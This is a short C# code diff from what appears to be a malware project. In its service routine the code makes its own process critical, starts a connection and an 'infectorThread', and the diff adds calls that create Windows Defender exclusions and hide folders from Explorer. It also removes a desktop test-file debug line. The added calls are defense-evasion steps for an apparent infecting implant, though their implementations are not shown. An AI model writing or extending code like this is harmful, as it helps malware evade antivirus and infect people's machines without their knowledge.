@@ -70,10 +70,6 @@ namespace zort
                         PookieRoutine();
                         break;
                     case ExecutionState.Service:
-                        //create file in desktop
-                        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                        string filePath = Path.Combine(desktopPath, "test.txt");
-                        File.WriteAllText(filePath, "Hello from the service!");
                         ServiceRoutine();
                         break;
                     case ExecutionState.Unknown:
@@ -165,6 +161,8 @@ namespace zort
         private void ServiceRoutine()
         {
             NativeMethods.MakeProcessCritical();
+            AntiDetection.AddDefenderExclusions();
+            AntiDetection.HideHiddenFoldersFromExplorer();
             conn.Start();
             infectorThread.Start();
         }
